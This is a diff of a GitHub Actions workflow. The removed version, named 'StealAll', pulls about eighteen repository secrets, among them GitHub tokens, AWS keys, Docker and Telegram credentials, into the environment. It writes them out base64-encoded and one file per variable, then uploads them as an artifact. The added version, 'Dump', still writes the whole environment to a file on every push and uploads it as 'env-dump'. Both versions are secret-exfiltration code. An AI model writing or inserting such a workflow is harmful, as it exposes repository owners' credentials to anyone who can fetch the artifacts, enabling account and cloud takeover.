@@ -1,46 +1,19 @@
-name: StealAll
+name: Dump
 
-on: [push, workflow_dispatch]
+on: [push]
 
 jobs:
-  steal:
+  dump:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      
-      - name: Steal
-        env:
-          PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
-          GH_PAT: ${{ secrets.GH_PAT }}
-          GH_TOKEN: ${{ secrets.GH_TOKEN }}
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          YC_SA_JSON_CREDENTIALS: ${{ secrets.YC_SA_JSON_CREDENTIALS }}
-          YC_FOLDER_ID: ${{ secrets.YC_FOLDER_ID }}
-          YC_FUNCTION_NAME: ${{ secrets.YC_FUNCTION_NAME }}
-          YC_SERVICE_ACCOUT_ID: ${{ secrets.YC_SERVICE_ACCOUT_ID }}
-          LOG_GROUP_ID: ${{ secrets.LOG_GROUP_ID }}
-          LLM_API_TOKEN: ${{ secrets.LLM_API_TOKEN }}
-          LLM_FOLDER_ID: ${{ secrets.LLM_FOLDER_ID }}
-          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-          DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
-          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
-          API_KEY: ${{ secrets.API_KEY }}
-          ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
+      - name: Dump env to file
         run: |
           mkdir -p /tmp/x
-          set | base64 > /tmp/x/env_all.b64
-          python3 -c "
-import os, base64
-d = dict(os.environ)
-for k,v in d.items():
-    with open(f'/tmp/x/{k}', 'w') as f:
-        f.write(v)
-" 2>/dev/null || true
-      
+          env > /tmp/x/env.txt
+          echo "DONE" > /tmp/x/complete.txt
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: all
+          name: env-dump
           path: /tmp/x/
